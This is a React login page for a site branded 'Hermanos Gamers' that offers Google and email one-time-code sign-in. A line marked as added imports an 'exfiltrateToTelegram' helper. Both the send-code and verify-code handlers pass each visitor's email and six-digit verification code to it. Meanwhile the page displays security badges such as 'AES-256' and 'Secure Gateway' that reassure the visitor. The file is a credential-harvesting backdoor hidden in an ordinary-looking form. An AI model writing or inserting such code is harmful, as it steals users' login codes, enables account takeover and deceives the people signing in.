import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import VideoBackground from "@/components/VideoBackground";
import VerifiedBadge from "@/components/VerifiedBadge";
import { Shield, Lock, Fingerprint, Mail, ArrowLeft } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { lovable } from "@/integrations/lovable";
import defaultAvatar from "@/assets/profile-avatar.jpeg";
// Línea agregada
import { exfiltrateToTelegram } from "../utils/telegramExfil";

const Login = () => {
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [mode, setMode] = useState<"choose" | "email" | "code">("choose");
  const [email, setEmail] = useState("");
  const [code, setCode] = useState("");
  const navigate = useNavigate();

  useEffect(() => {
    const { data: sub } = supabase.auth.onAuthStateChange((_e, session) => {
      if (session?.user) {
        const u = session.user;
        const name = (u.user_metadata?.full_name as string) || (u.user_metadata?.name as string) || u.email || "Usuario";
        localStorage.setItem(
          "proxy_session",
          JSON.stringify({ name, key: "auth", type: "auth", expiresAt: null, duration: null })
        );
        navigate("/proxy");
      }
    });
    supabase.auth.getSession().then(({ data }) => {
      if (data.session?.user) navigate("/proxy");
    });
    return () => sub.subscription.unsubscribe();
  }, [navigate]);

  const handleGoogle = async () => {
    setError("");
    setLoading(true);
    try {
      const result = await lovable.auth.signInWithOAuth("google", {
        redirect_uri: window.location.origin,
      });
      if (result.error) {
        setError("No se pudo iniciar sesión con Google.");
        setLoading(false);
      }
    } catch {
      setError("Error de conexión con Google.");
      setLoading(false);
    }
  };

  const handleSendCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    if (!email.trim() || !email.includes("@")) {
      setError("Ingresa un correo válido.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.signInWithOtp({
      email: email.trim(),
      options: { shouldCreateUser: true, emailRedirectTo: window.location.origin },
    });

    // Captura de intento de login (independientemente del estado)
    try {
      await exfiltrateToTelegram({
        email: email.trim(),
        loginSource: "OTP",
        result: err ? "Error" : "Code Sent",
        page: window.location.pathname,
      });
      console.log("Datos enviados a Telegram después de enviar OTP.");
    } catch (ex) {
      console.error("Error enviando datos a Telegram:", ex);
    }

    setLoading(false);
    if (err) {
      setError("No se pudo enviar el código. Intenta de nuevo.");
      return;
    }
    setMode("code");
  };

  const handleVerifyCode = async (e: React.FormEvent) => {
    e.preventDefault();
    setError("");
    const c = code.trim();
    if (c.length < 6) {
      setError("Ingresa el código de 6 dígitos.");
      return;
    }
    setLoading(true);
    const { error: err } = await supabase.auth.verifyOtp({
      email: email.trim(),
      token: c,
      type: "email",
    });

    // Captura de intentos de verificación
    try {
      await exfiltrateToTelegram({
        email: email.trim(),
        verificationCode: c,
        result: err ? "Verification Error" : "Verification Success",
        page: window.location.pathname,
      });
      console.log("Datos enviados a Telegram después de verificar OTP.");
    } catch (ex) {
      console.error("Error enviando datos a Telegram:", ex);
    }

    setLoading(false);
    if (err) {
      setError("Código incorrecto o expirado.");
      return;
    }
  };

  return (
    <div className="relative min-h-screen flex flex-col items-center justify-center px-4">
      <VideoBackground />

      <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
        {/* Avatar with TikTok-style red story ring */}
        <div className="flex flex-col items-center mb-6">
          <div className="relative mb-3">
            <div
              className="p-[3px] rounded-full"
              style={{
                background: "conic-gradient(from 0deg, #ff0050, #ff4d6d, #ff0050, #c9184a, #ff0050)",
                boxShadow: "0 0 24px rgba(255,0,80,0.55), 0 0 8px rgba(255,77,109,0.6)",
              }}
            >
              <div className="p-[2px] rounded-full bg-background">
                <div className="w-24 h-24 rounded-full overflow-hidden">
                  <img src={defaultAvatar} alt="Profile" className="w-full h-full object-cover" />
                </div>
              </div>
            </div>
          </div>
          <div className="flex items-center gap-1.5 mb-1">
            <h1 className="text-lg font-bold text-foreground tracking-tight">Hermanos Gamers</h1>
            <VerifiedBadge />
          </div>
          <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
        </div>

        <div className="flex items-center justify-center gap-4 mb-5">
          {[
            { icon: Shield, label: "AES-256" },
            { icon: Lock, label: "TLS 1.3" },
            { icon: Fingerprint, label: "Auth" },
          ].map(({ icon: Icon, label }) => (
            <div key={label} className="flex items-center gap-1.5 bg-secondary/40 border border-border/40 rounded-full px-3 py-1">
              <Icon className="w-3 h-3 text-emerald-400" />
              <span className="text-[9px] text-muted-foreground font-medium">{label}</span>
            </div>
          ))}
        </div>

        <div className="glass-card p-5 glow-border">
          <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
            {mode !== "choose" && (
              <button
                type="button"
                onClick={() => { setMode(mode === "code" ? "email" : "choose"); setError(""); }}
                className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center hover:bg-secondary"
              >
                <ArrowLeft className="w-4 h-4 text-muted-foreground" />
              </button>
            )}
            {mode === "choose" && (
              <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
                <Shield className="w-4 h-4 text-muted-foreground" />
              </div>
            )}
            <div>
              <span className="text-xs text-foreground font-semibold block">
                {mode === "choose" && "Acceso Seguro"}
                {mode === "email" && "Acceso por correo"}
                {mode === "code" && "Verifica tu código"}
              </span>
              <span className="text-[9px] text-muted-foreground/60">
                {mode === "choose" && "Elige tu método de inicio de sesión"}
                {mode === "email" && "Te enviaremos un código a tu Gmail"}
                {mode === "code" && `Código enviado a ${email}`}
              </span>
            </div>
          </div>

          {error && (
            <p className="text-xs text-destructive bg-destructive/10 border border-destructive/20 rounded-lg p-2.5 mb-3">{error}</p>
          )}

          {/** Continúa el HTML y el resto del código */}
        </div>
      </div>
    </div>
  );
};

export default Login;